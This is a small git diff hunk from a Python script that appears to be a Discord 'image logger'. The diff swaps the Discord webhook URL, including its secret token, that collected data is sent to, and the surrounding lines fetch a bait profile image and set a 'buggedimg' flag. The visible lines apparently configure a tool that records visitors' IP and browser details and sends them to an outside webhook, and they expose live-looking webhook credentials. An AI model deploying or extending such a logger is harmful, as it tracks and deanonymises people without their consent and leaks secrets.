@@ -81,7 +81,7 @@ def reportError(error):
     "embeds": [
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1379554736260513853/mULMH0NoNCxXm7jJvykBYtxOWP0xIhSkl3jf4RzQ_mqe1hJi1UJE1_LQAa502pIzvvCq'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
